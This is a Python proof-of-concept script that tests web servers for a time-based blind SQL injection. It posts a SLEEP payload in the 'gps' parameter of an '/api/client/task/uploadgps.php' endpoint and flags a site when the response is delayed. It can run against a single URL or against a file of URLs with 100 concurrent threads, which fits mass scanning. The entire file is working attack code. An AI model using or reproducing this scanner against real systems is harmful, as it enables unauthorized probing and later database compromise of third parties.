import requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def poc(url):
    try:
        path = "/api/client/task/uploadgps.php"
        payload = "uuid=&gps=1'+AND+(SELECT+7679+FROM+(SELECT(SLEEP(4)))ozYR)+AND+'fqDZ'='fqDZ&number="
        full_url = url + path
        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }
        start_time = time.time()
        response = requests.post(full_url, data=payload, headers=headers, timeout=30)
        elapsed_time = time.time() - start_time
  
        if 4 <= elapsed_time < 6:
            print(f"[+]{url}可能存在SQL注入漏洞")
        else:
            print(f"[-]{url}不存在SQL漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()